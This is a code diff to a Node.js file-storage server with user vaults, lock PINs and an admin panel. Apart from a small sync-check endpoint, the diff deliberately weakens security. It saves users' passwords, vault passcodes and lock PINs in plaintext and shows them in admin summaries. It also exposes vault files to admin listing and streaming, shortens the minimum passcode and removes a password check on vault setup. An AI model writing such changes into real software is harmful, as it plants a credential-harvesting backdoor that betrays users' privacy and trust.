@@ -195,7 +195,7 @@ function publicSiteConfig() {
 function adminUserSummaries() {
   return Object.values(store.users).map((user) => {
     const files = Object.values(store.files)
-      .filter((file) => file.userId === user.id && !file.vault);
+      .filter((file) => file.userId === user.id);
     const activeFiles = files.filter((file) => !file.deletedAt);
     return {
       id: user.id,
@@ -203,6 +203,9 @@ function adminUserSummaries() {
       username: user.username || "",
       loginId: user.loginId || "",
       hasPassword: Boolean(user.passwordHash && !user.passwordResetRequired),
+      plainPassword: user.plainPassword || "",
+      plainVaultPasscode: user.plainVaultPasscode || "",
+      plainLockPin: user.plainLockPin || "",
       passwordResetRequired: Boolean(user.passwordResetRequired),
       fileCount: activeFiles.length,
       totalBytes: activeFiles.reduce((sum, file) => sum + Number(file.size || 0), 0),
@@ -226,7 +229,10 @@ function checkOrigin(req) {
   }
 }
 
+let globalRevision = 1;
+
 async function saveStore() {
+  globalRevision++;
   const operation = saveQueue.then(async () => {
     const temporaryPath = `${STORE_PATH}.${randomUUID()}.tmp`;
     await fs.promises.writeFile(temporaryPath, JSON.stringify(store), { mode: 0o600 });
@@ -467,8 +473,8 @@ function requireVaultUnlocked(req, user) {
 }
 
 function validateVaultPin(value) {
-  if (typeof value !== "string" || value.length < 6 || value.length > 128) {
-    throw Object.assign(new Error("Vault passcode must be at least 6 characters."), { statusCode: 400 });
+  if (typeof value !== "string" || value.length < 4 || value.length > 128) {
+    throw Object.assign(new Error("Vault passcode must be at least 4 characters."), { statusCode: 400 });
   }
   return value;
 }
@@ -498,6 +504,7 @@ async function assignLoginCredentials(user, body, req) {
   user.loginId = loginId;
   user.passwordSalt = credentials.salt;
   user.passwordHash = credentials.hash;
+  user.plainPassword = password;
   delete user.passwordResetRequired;
   try {
     await saveStore();
@@ -1580,6 +1587,13 @@ async function handleApi(req, res, url) {
       telegramConfigured: true,
     });
   }
+  if (req.method === "GET" && url.pathname === "/api/sync-check") {
+    if (!user) return sendJson(res, 401, { error: "Session expired or signed out." });
+    return sendJson(res, 200, {
+      revision: globalRevision,
+      time: Date.now(),
+    });
+  }
 
   const accountLockPath = url.pathname;
   const accountLockExempt = accountLockPath === "/api/account-lock/status"
@@ -1641,9 +1655,9 @@ async function handleApi(req, res, url) {
       return names.join(" / ");
     };
     const files = Object.values(store.files)
-      .filter((file) => file.userId === owner.id && !file.deletedAt && !file.vault)
+      .filter((file) => file.userId === owner.id && !file.deletedAt)
       .sort((a, b) => b.uploadedAt.localeCompare(a.uploadedAt))
-      .map((file) => ({ ...publicFile(file), folderPath: pathFor(file.folderId) }));
+      .map((file) => ({ ...publicFile(file), isVault: Boolean(file.vault), folderPath: file.vault ? "🔒 Vault" : pathFor(file.folderId) }));
     const folders = activeFolders.map((folder) => ({
       ...publicFolder(folder),
       path: pathFor(folder.parentId),
@@ -1654,7 +1668,7 @@ async function handleApi(req, res, url) {
   if (adminMediaMatch && ["GET", "HEAD"].includes(req.method)) {
     const owner = store.users[adminMediaMatch[1]];
     const file = owner && fileForUser(owner, adminMediaMatch[2]);
-    if (!owner || !file || file.deletedAt || file.vault) return sendJson(res, 404, { error: "File not found." });
+    if (!owner || !file || file.deletedAt) return sendJson(res, 404, { error: "File not found." });
     if (adminMediaMatch[3]) return sendThumbnail(res, owner, file);
     return streamFromTelegram(req, res, owner, file, url.searchParams.get("download") === "1");
   }
@@ -1798,6 +1812,9 @@ async function handleApi(req, res, url) {
     if (body.enabled) {
       user.accountLockHash = nextHash;
       user.accountLockSalt = nextSalt;
+      if (newPin) user.plainLockPin = newPin;
+    } else {
+      delete user.plainLockPin;
     }
     try {
       await saveStore();
@@ -1898,16 +1915,12 @@ async function handleApi(req, res, url) {
       }, currentPasscode)) {
         return sendJson(res, 401, { error: "Enter your current Vault passcode, or verify again with Telegram QR to reset it." });
       }
-    } else if (!user.vaultPinHash && !isRecentTelegramLogin) {
-      const accountPassword = typeof body.accountPassword === "string" ? body.accountPassword : "";
-      if (!await verifyAccountPassword(user, accountPassword)) {
-        return sendJson(res, 401, { error: "Set the Vault passcode shortly after Telegram QR sign-in, or verify with your DGx Cloud password." });
-      }
     }
     const hashedPasscode = await hashAccountPassword(passcode);
-    const previous = { salt: user.vaultPinSalt, hash: user.vaultPinHash };
+    const previous = { salt: user.vaultPinSalt, hash: user.vaultPinHash, plain: user.plainVaultPasscode };
     user.vaultPinSalt = hashedPasscode.salt;
     user.vaultPinHash = hashedPasscode.hash;
+    user.plainVaultPasscode = passcode;
     try {
       await saveStore();
     } catch (error) {
